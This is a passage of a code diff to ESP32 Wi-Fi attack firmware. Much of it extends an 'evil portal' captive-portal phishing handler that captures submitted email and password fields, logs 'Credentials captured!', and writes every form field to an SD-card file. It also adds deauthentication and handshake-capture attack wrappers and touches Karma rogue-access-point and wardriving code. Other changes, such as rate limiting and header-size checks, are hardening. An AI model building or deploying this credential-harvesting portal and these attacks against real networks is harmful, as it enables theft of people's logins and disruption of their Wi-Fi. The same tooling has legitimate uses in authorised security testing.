+            for (int i = 0; email_keys[i] != NULL; i++) {
+                if (get_query_param_value(query, email_keys[i], val_buf, sizeof(val_buf)) == ESP_OK) {
+                    url_decode(decoded_email, val_buf);
+                    if (decoded_email[0] != '\0') break;
+                }
+            }
+        }
+        if (decoded_password[0] == '\0') {
+            const char *pass_keys[] = {"pass", "passwd", "pin", NULL};
+            for (int i = 0; pass_keys[i] != NULL; i++) {
+                if (get_query_param_value(query, pass_keys[i], val_buf, sizeof(val_buf)) == ESP_OK) {
+                    url_decode(decoded_password, val_buf);
+                    if (decoded_password[0] != '\0') break;
+                }
+            }
+        }
+
+        // Log primary credentials if found
+        if (decoded_email[0] != '\0' || decoded_password[0] != '\0') {
+            glog("Captured credentials: %s / %s\n", decoded_email, decoded_password);
+            toast_show("Credentials captured!", TOAST_SUCCESS);
+        }
+
+        // Build a full field dump for the log (all query params)
+        char all_fields[384] = {0};
+        int af_pos = 0;
+        const char *p = query;
+        while (*p && af_pos < (int)sizeof(all_fields) - 1) {
+            const char *eq = strchr(p, '=');
+            const char *amp = strchr(p, '&');
+            if (!eq) break;
+            char key_buf[64] = {0};
+            char val_buf2[128] = {0};
+            size_t klen = (size_t)(eq - p);
+            if (klen >= sizeof(key_buf)) klen = sizeof(key_buf) - 1;
+            strncpy(key_buf, p, klen);
+            key_buf[klen] = '\0';
+            const char *vstart = eq + 1;
+            size_t vlen = amp ? (size_t)(amp - vstart) : strlen(vstart);
+            if (vlen >= sizeof(val_buf2)) vlen = sizeof(val_buf2) - 1;
+            strncpy(val_buf2, vstart, vlen);
+            val_buf2[vlen] = '\0';
+            char decoded_val[128] = {0};
+            url_decode(decoded_val, val_buf2);
+            int written = snprintf(all_fields + af_pos, sizeof(all_fields) - (size_t)af_pos,
+                                   "%s%s=%s", (af_pos > 0 ? ", " : ""), key_buf, decoded_val);
+            if (written > 0) af_pos += written;
+            p = amp ? amp + 1 : p + strlen(p);
+        }
+
+        // Write to credentials file
         if (current_creds_filename[0] != '\0') {
-            char line[128];
-            int n = snprintf(line, sizeof(line), "Email: %s, Password: %s\n", decoded_email, decoded_password);
+            char line[512];
+            int n;
+            if (decoded_email[0] != '\0' || decoded_password[0] != '\0') {
+                n = snprintf(line, sizeof(line), "Email: %s, Password: %s | All: %s\n",
+                             decoded_email, decoded_password, all_fields);
+            } else {
+                n = snprintf(line, sizeof(line), "Fields: %s\n", all_fields);
+            }
             if (n > 0 && (size_t)n < sizeof(line)) {
                 if (!require_jit) {
                     if (sd_card_manager.is_initialized) {
                         FILE *f = fopen(current_creds_filename, "a");
-                        if (f) { 
-                            fwrite(line, 1, (size_t)n, f); 
-                            fclose(f); 
+                        if (f) {
+                            fwrite(line, 1, (size_t)n, f);
+                            fclose(f);
                         }
                     }
                 } else {
                     size_t cp = (size_t)n;
                     if (s_portal_creds_len + cp > PORTAL_CREDS_BUF_SZ) {
-                        portal_flush_buffers_to_sd();
-                        cp = (size_t)n;
-                        if (cp > PORTAL_CREDS_BUF_SZ) cp = PORTAL_CREDS_BUF_SZ;
+                        portal_flush_buffers_if_due();
                     }
+                    size_t avail = PORTAL_CREDS_BUF_SZ - s_portal_creds_len;
+                    if (cp > avail) cp = avail;
                     memcpy(s_portal_creds_buf + s_portal_creds_len, line, cp);
                     s_portal_creds_len += cp;
                 }
@@ -1199,24 +1640,36 @@ esp_err_t get_info_handler(httpd_req_t *req) {
 }
 
 esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
-    ESP_LOGI(TAG, "Free heap at redirect handler entry: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
+    // Enforce a lightweight per-client HTTP rate limit early, before any heap
+    // allocations or expensive portal serving work.
+    uint32_t client_addr = portal_get_client_addr(req);
+    if (client_addr != 0 && !portal_http_rate_limit_allow(client_addr)) {
+        httpd_resp_set_hdr(req, "Connection", "close");
+        httpd_resp_set_status(req, "429 Too Many Requests");
+        httpd_resp_send(req, "Too many requests", HTTPD_RESP_USE_STRLEN);
+        return ESP_OK;
+    }
+
+    ESP_LOGD(TAG, "Free heap at redirect handler entry: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
     // Log Host header and User-Agent for diagnostics (help debug iOS probe behavior)
     char *req_host = get_host_from_req(req);
     if (req_host) {
-        ESP_LOGI(TAG, "Redirect handler Host header: %s", req_host);
+        ESP_LOGD(TAG, "Redirect handler Host header: %s", req_host);
         free(req_host);
     } else {
-        ESP_LOGI(TAG, "Redirect handler: Host header not present");
+        ESP_LOGD(TAG, "Redirect handler: Host header not present");
     }
-    size_t ua_len = httpd_req_get_hdr_value_len(req, "User-Agent") + 1;
-    if (ua_len > 1) {
-        char *ua = malloc(ua_len);
+    size_t ua_len = httpd_req_get_hdr_value_len(req, "User-Agent");
+    if (ua_len > 0 && ua_len <= PORTAL_MAX_DIAGNOSTIC_HEADER_SIZE) {
+        char *ua = malloc(ua_len + 1);
         if (ua) {
-            if (httpd_req_get_hdr_value_str(req, "User-Agent", ua, ua_len) == ESP_OK) {
-                ESP_LOGI(TAG, "Redirect handler User-Agent: %s", ua);
+            if (httpd_req_get_hdr_value_str(req, "User-Agent", ua, ua_len + 1) == ESP_OK) {
+                ESP_LOGD(TAG, "Redirect handler User-Agent: %s", ua);
             }
             free(ua);
         }
+    } else if (ua_len > PORTAL_MAX_DIAGNOSTIC_HEADER_SIZE) {
+        ESP_LOGW(TAG, "Ignoring oversized User-Agent header (%zu bytes)", ua_len);
     }
     if (login_done) {
         httpd_resp_set_hdr(req, "Cache-Control", "no-store");
@@ -1239,12 +1692,13 @@ esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
     ) {
         httpd_resp_set_hdr(req, "Cache-Control", "no-store");
         esp_err_t r = portal_handler(req);
-        ESP_LOGI(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
+        ESP_LOGD(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
         return r;
     }
     // minimal logging for captive probe
 
-    if (strstr(req->uri, "/get") != NULL) {
+    if (strncmp(req->uri, "/get", 4) == 0 &&
+        (req->uri[4] == '\0' || req->uri[4] == '?')) {
         get_info_handler(req);
         return ESP_OK;
     }
@@ -1256,8 +1710,8 @@ esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
     if (is_html && html_buffer != NULL && html_buffer_size > 0) {
         httpd_resp_set_hdr(req, "Cache-Control", "no-store");
         esp_err_t r = portal_handler(req);
-        ESP_LOGI(TAG, "Served HTML URL via buffer portal for URI: %s", u);
-        ESP_LOGI(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size());
+        ESP_LOGD(TAG, "Served HTML URL via buffer portal for URI: %s", u);
+        ESP_LOGD(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size());
         return r;
     }
 
@@ -1275,7 +1729,7 @@ esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
     httpd_resp_set_status(req, "302 Found");
     httpd_resp_set_hdr(req, "Location", "http://192.168.4.1/login");
     httpd_resp_send(req, NULL, 0);
-    ESP_LOGI(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
+    ESP_LOGD(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
     return ESP_OK;
 }
 
@@ -1335,6 +1789,10 @@ httpd_handle_t start_portal_webserver(void) {
     config.ctrl_port = 32769;
     config.lru_purge_enable = true;
     config.stack_size = 4096;
+    // Short socket timeouts so a flooded or stalled client cannot pin a socket
+    // for long.  These apply to the portal server only.
+    config.recv_wait_timeout = 3;
+    config.send_wait_timeout = 3;
 #if CONFIG_FREERTOS_UNICORE
     config.core_id = 0;
 #endif
@@ -1392,6 +1850,8 @@ httpd_handle_t start_portal_webserver(void) {
         httpd_uri_t redirect_head = {.uri = "/redirect", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
         httpd_uri_t log_handler_uri = {
             .uri = "/api/log", .method = HTTP_POST, .handler = get_log_handler, .user_ctx = NULL};
+        httpd_uri_t get_handler_post = {
+            .uri = "/get", .method = HTTP_POST, .handler = get_info_handler, .user_ctx = NULL};
         httpd_uri_t portal_png = {
             .uri = ".png", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
         httpd_uri_t portal_jpg = {
@@ -1427,6 +1887,7 @@ httpd_handle_t start_portal_webserver(void) {
         httpd_register_uri_handler(evilportal_server, &redirect_head);
         httpd_register_uri_handler(evilportal_server, &portal_uri);
         httpd_register_uri_handler(evilportal_server, &log_handler_uri);
+        httpd_register_uri_handler(evilportal_server, &get_handler_post);
 
         httpd_register_uri_handler(evilportal_server, &portal_png);
         httpd_register_uri_handler(evilportal_server, &portal_jpg);
@@ -1479,6 +1940,10 @@ esp_err_t wifi_manager_start_evil_portal(const char *URLorFilePath, const char *
     current_keystrokes_filename[0] = '\0';
     s_portal_keystroke_len = 0;
     s_portal_creds_len = 0;
+    s_portal_log_window_started_us = 0;
+    s_portal_log_requests_in_window = 0;
+    s_portal_last_flush_us = 0;
+    memset(s_portal_http_rl_table, 0, sizeof(s_portal_http_rl_table));
     portal_sd_jit_mounted = false;
     portal_display_suspended = false;
     // jit mount sd for somethingsomething template only
@@ -1544,7 +2009,7 @@ esp_err_t wifi_manager_start_evil_portal(const char *URLorFilePath, const char *
                 fseek(pf, 0, SEEK_END);
                 long pf_size = ftell(pf);
                 rewind(pf);
-                if (pf_size > 0) {
+                if (pf_size > 0 && pf_size <= PORTAL_MAX_FILE_CACHE_SIZE) {
                     char *pf_buf = NULL;
 #if CONFIG_SPIRAM
                     pf_buf = (char*)heap_caps_malloc((size_t)pf_size + 1, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
@@ -1557,16 +2022,23 @@ esp_err_t wifi_manager_start_evil_portal(const char *URLorFilePath, const char *
 #endif
                     if (pf_buf != NULL) {
                         size_t pf_read = fread(pf_buf, 1, (size_t)pf_size, pf);
-                        pf_buf[pf_read] = '\0';
-                        portal_file_cache      = pf_buf;
-                        portal_file_cache_size = pf_read;
-                        ESP_LOGI(TAG, "Portal file pre-loaded into cache: %zu bytes from %s",
-                                 pf_read, URLorFilePath);
+                        if (pf_read == (size_t)pf_size) {
+                            pf_buf[pf_read] = '\0';
+                            portal_file_cache      = pf_buf;
+                            portal_file_cache_size = pf_read;
+                            ESP_LOGI(TAG, "Portal file pre-loaded into cache: %zu bytes from %s",
+                                     pf_read, URLorFilePath);
+                        } else {
+                            ESP_LOGW(TAG, "Portal file cache: incomplete read (%zu/%ld bytes) from %s",
+                                     pf_read, pf_size, URLorFilePath);
+                            free(pf_buf);
+                        }
                     } else {
                         ESP_LOGW(TAG, "Portal file cache: malloc failed for %ld bytes", pf_size);
                     }
                 } else {
-                    ESP_LOGW(TAG, "Portal file cache: fseek/ftell returned %ld for %s", pf_size, URLorFilePath);
+                    ESP_LOGW(TAG, "Portal file cache: refusing %ld-byte file from %s (limit %u bytes)",
+                             pf_size, URLorFilePath, (unsigned)PORTAL_MAX_FILE_CACHE_SIZE);
                 }
                 fclose(pf);
             } else {
@@ -1815,7 +2287,7 @@ void wifi_manager_start_monitor_mode(wifi_promiscuous_cb_t_t callback) {
     if (callback == wifi_beacon_scan_callback || callback == wifi_probe_scan_callback || 
         callback == wifi_deauth_scan_callback || callback == wifi_pwn_scan_callback ||
         callback == wifi_wps_detection_callback || callback == wifi_listen_probes_callback ||
-        callback == wifi_pineap_detector_callback) {
+        callback == wifi_pineap_detector_callback || callback == wardriving_scan_callback) {
         // Management frames only
         filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
     } else if (callback == wifi_eapol_scan_callback) {
@@ -1893,6 +2365,7 @@ void wifi_manager_stop_monitor_mode() {
         return;
     }
 
+    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(NULL));
     ESP_ERROR_CHECK(esp_wifi_set_promiscuous(false));
     status_display_show_status("Monitor Stopped");
 
@@ -2013,33 +2486,48 @@ void wifi_manager_init(void) {
         }
     }
 
-    // Set WiFi mode to STA (station)
-    ESP_LOGI(TAG, "wifi_manager: setting WiFi mode to APSTA...");
-    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
-    ESP_LOGI(TAG, "wifi_manager: WiFi mode set, free internal RAM: %d bytes", 
+    // Bring the AP interface up only when the SoftAP is actually enabled in
+    // settings. Running STA-only otherwise keeps the AP MAC (beaconing + AP
+    // TX buffers) from activating, reclaiming internal RAM on starved boards.
+    // The AP netif itself stays allocated above, so wifiAP is never NULL and
+    // portal/AP code paths are unaffected. Attacks that inject on WIFI_IF_AP
+    // (deauth, beacon spam, channel-switch) set AP mode themselves before TX;
+    // eapol-logoff is hardened to do the same. Promiscuous/monitor and STA
+    // scanning all work in STA mode, so sniffing/wardriving is unaffected.
+    bool ap_enabled = settings_get_ap_enabled(&G_Settings);
+    if (ap_enabled) {
+        ESP_LOGI(TAG, "wifi_manager: setting WiFi mode to APSTA...");
+        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
+    } else {
+        ESP_LOGI(TAG, "wifi_manager: AP disabled in settings, setting WiFi mode to STA...");
+        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
+    }
+    ESP_LOGI(TAG, "wifi_manager: WiFi mode set, free internal RAM: %d bytes",
              (int)heap_caps_get_free_size(MALLOC_CAP_INTERNAL));
 
-    // Configure the SoftAP settings
-    ESP_LOGI(TAG, "wifi_manager: configuring AP...");
-    wifi_config_t ap_config = {
-        .ap = {.ssid = "",
-               .ssid_len = strlen(""),
-               .password = "",
-               .channel = 1,
-               .authmode = WIFI_AUTH_OPEN,
-               .max_connection = 4,
-               .ssid_hidden = 1},
-    };
+    if (ap_enabled) {
+        // Configure the SoftAP settings
+        ESP_LOGI(TAG, "wifi_manager: configuring AP...");
+        wifi_config_t ap_config = {
+            .ap = {.ssid = "",
+                   .ssid_len = strlen(""),
+                   .password = "",
+                   .channel = 1,
+                   .authmode = WIFI_AUTH_OPEN,
+                   .max_connection = 4,
+                   .ssid_hidden = 1},
+        };
 
-    // Apply the AP configuration
-    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
-    
-    // Start the Wi-Fi AP
+        // Apply the AP configuration
+        ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
+    }
+
+    // Start Wi-Fi
     ESP_LOGI(TAG, "wifi_manager: starting WiFi (esp_wifi_start)...");
     ESP_ERROR_CHECK(esp_wifi_start());
     ESP_LOGI(TAG, "wifi_manager: WiFi started, free internal RAM: %d bytes", 
-             (int)heap_caps_get_free_size(MALLOC_CAP_INTERNAL));
-    
+              (int)heap_caps_get_free_size(MALLOC_CAP_INTERNAL));
+     
     // Additional WiFi stability settings
     // Set maximum TX power to improve signal strength
     esp_wifi_set_max_tx_power(78); // 19.5 dBm (78/4)
@@ -2767,6 +3255,20 @@ void wifi_manager_auto_deauth() {
 void wifi_manager_stop_deauth() {
     deauth_attack_stop();
 }
+
+// Handshake + Deauth combined attack wrappers
+void wifi_manager_start_handshake_deauth() {
+    deauth_attack_start_handshake_deauth();
+}
+
+bool wifi_manager_stop_handshake_deauth() {
+    return deauth_attack_stop_handshake_deauth();
+}
+
+bool wifi_manager_handshake_deauth_is_running() {
+    return deauth_attack_handshake_deauth_is_running();
+}
+
 static void wifi_manager_print_ap_entry_formatted(uint16_t idx, const wifi_ap_record_t *rec, bool include_security) {
     char sanitized_ssid[33];
     sanitize_ssid_and_check_hidden((uint8_t *)rec->ssid, sanitized_ssid, sizeof(sanitized_ssid));
@@ -3102,6 +3604,11 @@ static void live_ap_scan_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
             uint16_t cap = (uint16_t)payload[34] | ((uint16_t)payload[35] << 8);
             if (cap & 0x0010) rec->authmode = WIFI_AUTH_WEP; else rec->authmode = WIFI_AUTH_OPEN;
         }
+        char ap_payload[96];
+        snprintf(ap_payload, sizeof(ap_payload), "%02x:%02x:%02x:%02x:%02x:%02x|%d|%d",
+            bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
+            rec->primary, rec->rssi);
+        ghostscript_emit_event("wifi_ap_found", ap_payload);
     }
 
     uint32_t now_ms = (uint32_t)(esp_timer_get_time() / 1000);
@@ -3356,7 +3863,11 @@ void wifi_manager_connect_wifi(const char *ssid, const char *password) {
     // Set the connecting bit BEFORE any WiFi operations
     xEventGroupSetBits(wifi_event_group, WIFI_CONNECTING_BIT);
 
-    esp_err_t err = esp_wifi_set_mode(WIFI_MODE_APSTA);
+    // Match the init policy: keep the AP half only when the SoftAP is enabled,
+    // otherwise connect STA-only so the AP interface's internal RAM stays freed
+    // during normal connected operation (this is the state Cloud Store runs in).
+    wifi_mode_t connect_mode = settings_get_ap_enabled(&G_Settings) ? WIFI_MODE_APSTA : WIFI_MODE_STA;
+    esp_err_t err = esp_wifi_set_mode(connect_mode);
     if (err != ESP_OK) {
         printf("Failed to set WiFi mode: %s\n", esp_err_to_name(err));
         TERMINAL_VIEW_ADD_TEXT("Failed to set WiFi mode\n");
@@ -3684,44 +4195,72 @@ static void apply_selected_ap_capture_channel_plan(wifi_promiscuous_cb_t_t callb
     printf("\n");
 }
 
-void wifi_manager_start_wireshark_channel_hop(void) {
+esp_err_t wifi_manager_start_wireshark_channel_list(const uint8_t *channels, size_t count) {
+    if (!channels || count == 0 || count > sizeof(wireshark_channels)) return ESP_ERR_INVALID_ARG;
+
+    uint8_t unique[sizeof(wireshark_channels)] = {0};
+    size_t unique_count = 0;
+    for (size_t i = 0; i < count; i++) {
+        if (channels[i] < 1 || channels[i] > MAX_WIFI_CHANNEL) return ESP_ERR_INVALID_ARG;
+        bool seen = false;
+        for (size_t j = 0; j < unique_count; j++) {
+            if (unique[j] == channels[i]) {
+                seen = true;
+                break;
+            }
+        }
+        if (!seen) unique[unique_count++] = channels[i];
+    }
+    if (unique_count == 1) return wifi_manager_set_wireshark_fixed_channel(unique[0]);
+
     if (wireshark_channel_hop_timer != NULL) {
         esp_timer_stop(wireshark_channel_hop_timer);
         esp_timer_delete(wireshark_channel_hop_timer);
         wireshark_channel_hop_timer = NULL;
     }
+    wireshark_hopping_active = false;
 
-    // build country-appropriate channel list
-    wireshark_channels_count = wifi_channels_build_country_list(wireshark_channels, sizeof(wireshark_channels));
-    if (wireshark_channels_count == 0) {
-        ESP_LOGE(TAG, "No channels available for Wireshark hopping");
-        return;
-    }
-
+    memcpy(wireshark_channels, unique, unique_count);
+    wireshark_channels_count = unique_count;
     wireshark_channel_index = 0;
-    esp_wifi_set_channel(wireshark_channels[wireshark_channel_index], WIFI_SECOND_CHAN_NONE);
+
+    wifi_second_chan_t second = WIFI_SECOND_CHAN_NONE;
+#if defined(CONFIG_IDF_TARGET_ESP32C5)
+    if (wireshark_channels[0] > 14) second = WIFI_SECOND_CHAN_ABOVE;
+#endif
+    esp_err_t err = esp_wifi_set_channel(wireshark_channels[0], second);
+    if (err != ESP_OK) return err;
 
     esp_timer_create_args_t timer_args = {
         .callback = wireshark_channel_hop_timer_callback,
         .name = "wireshark_hop"
     };
-
-    esp_err_t err = esp_timer_create(&timer_args, &wireshark_channel_hop_timer);
-    if (err != ESP_OK) {
-        ESP_LOGE(TAG, "Failed to create Wireshark channel hop timer");
-        return;
-    }
+    err = esp_timer_create(&timer_args, &wireshark_channel_hop_timer);
+    if (err != ESP_OK) return err;
 
     err = esp_timer_start_periodic(wireshark_channel_hop_timer, WIRESHARK_CHANNEL_HOP_INTERVAL_MS * 1000);
     if (err != ESP_OK) {
-        ESP_LOGE(TAG, "Failed to start Wireshark channel hop timer");
         esp_timer_delete(wireshark_channel_hop_timer);
         wireshark_channel_hop_timer = NULL;
-        return;
+        return err;
     }
 
     wireshark_hopping_active = true;
-    ESP_LOGI(TAG, "Wireshark Channel Hopping Started (%d channels, 150ms interval)", wireshark_channels_count);
+    return ESP_OK;
+}
+
+void wifi_manager_start_wireshark_channel_hop(void) {
+    uint8_t channels[sizeof(wireshark_channels)] = {0};
+
+    // build country-appropriate channel list
+    size_t count = wifi_channels_build_country_list(channels, sizeof(channels));
+    if (count == 0) {
+        ESP_LOGE(TAG, "No channels available for Wireshark hopping");
+        return;
+    }
+    esp_err_t err = wifi_manager_start_wireshark_channel_list(channels, count);
+    if (err != ESP_OK) ESP_LOGE(TAG, "Failed to start Wireshark channel hopping: %s", esp_err_to_name(err));
+    else ESP_LOGI(TAG, "Wireshark Channel Hopping Started (%d channels, 150ms interval)", count);
 }
 
 void wifi_manager_stop_wireshark_channel_hop(void) {
@@ -4063,12 +4602,12 @@ static bool karma_running = false;
 static TaskHandle_t karma_task_handle = NULL;
 
 // Add these globals near your other Karma variables
-static char karma_ssid_cache[KARMA_MAX_SSIDS][33];
+EXT_RAM_BSS_ATTR static char karma_ssid_cache[KARMA_MAX_SSIDS][33];
 static int karma_ssid_count = 0;
 static int karma_ssid_index = 0;
 static uint32_t last_ssid_change_time = 0;
 static bool karma_ssid_manual_mode = false;
-static char karma_portal_file[256] = "default";
+static char karma_portal_file[256] = "default"; // non-zero initializer: must stay in .data, not PSRAM .bss
 
 
 // Helper to add SSID to cache if not present
